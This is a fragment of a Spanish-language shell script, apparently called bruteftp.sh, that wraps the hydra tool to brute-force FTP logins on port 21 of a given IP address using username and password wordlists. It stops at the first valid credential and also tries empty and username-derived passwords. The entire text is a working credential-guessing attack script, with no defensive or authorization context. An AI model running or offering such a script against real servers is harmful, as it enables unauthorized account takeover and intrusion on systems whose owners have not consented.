...
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a FTP en puerto por defecto 21/TCP."
        echo "Requiere hydra"
        echo "Uso.: sh bruteftp.sh <ip>"
        echo
        exit 0
fi
echo
echo
hydra $1 ftp -s 21 -L usuarios0.txt -P claves0.txt -f -e nsr -w 20 -t 3 $2 $3 $4
